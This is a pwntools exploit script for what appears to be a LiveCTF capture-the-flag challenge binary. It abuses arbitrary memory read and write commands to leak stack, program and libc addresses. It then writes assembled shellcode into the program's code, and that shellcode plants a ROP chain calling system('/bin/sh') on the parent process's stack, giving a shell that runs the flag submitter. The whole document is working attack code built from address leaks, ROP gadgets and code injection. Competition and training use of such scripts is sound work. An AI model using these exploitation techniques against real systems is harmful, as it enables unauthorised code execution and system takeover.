from pwn import *
from time import sleep
HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

exe = ELF("challenge", checksec=False)
libc = ELF("libc.so.6", checksec=False)

#context.log_level = "DEBUG"
context.binary = exe
context.terminal = "kitty -e sh -c".split()


def read(addr):
    r.sendlineafter(b"Choice: \n",b"1")
    r.sendlineafter(b"Address: \n",hex(addr).encode()[2:])
    r.recvuntil(b"Value: ")
    return int(r.recvline().rstrip(b"\n"), 16)

def write(val,addr):
    r.sendlineafter(b"Choice: \n",b"2")
    r.sendlineafter(b"Value: \n",hex(val).encode()[2:])
    r.sendlineafter(b"Address: \n",hex(addr).encode()[2:])

#r = process(exe.path)
r = remote(HOST, int(PORT))

#pause()

stack = read(1)
#log.info("Stack => %s" % hex(stack))

exe.address = read(stack-0x0100) - exe.symbols.main
#log.info("ELF => %s" % hex(exe.address))

libc.address = read(stack-0x110) - 0x29d90
#log.info("Libc => %s" % hex(libc.address))


pop_rdi = libc.address + 0x2a3e5
ret = libc.address + 0x29139
bin_sh = next(libc.search(b"/bin/sh\x00"))

shellcode = asm(f"""
mov r12, {exe.symbols.writev_helper}
mov r13, {stack-0x110}

xor rax, rax
mov ax, 110
syscall

mov rdi, rax
push rdi
lea rsi, [r13]
mov rdx, {ret}
call r12

pop rdi
push rdi
lea rsi, [r13+0x8]
mov rdx, {pop_rdi}
call r12

pop rdi
push rdi
lea rsi, [r13+0x10]
mov rdx, {bin_sh}
call r12

pop rdi
lea rsi, [r13+0x18]
mov rdx, {libc.symbols.system}
call r12

loop:
jmp loop
""")

shellcode = shellcode + b"\x00"*(8-(len(shellcode)%8))

for i in range(len(shellcode), 0, -8):
    sleep(0.05)
    write(unpack(shellcode[i-8:i], 64), exe.address+0x147e+i)

write(0x9090909090909090, exe.address+0x147e)

r.sendlineafter(b"Choice: \n", b"3")

r.sendline(b'./submitter')
flag = r.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)

#r.interactive()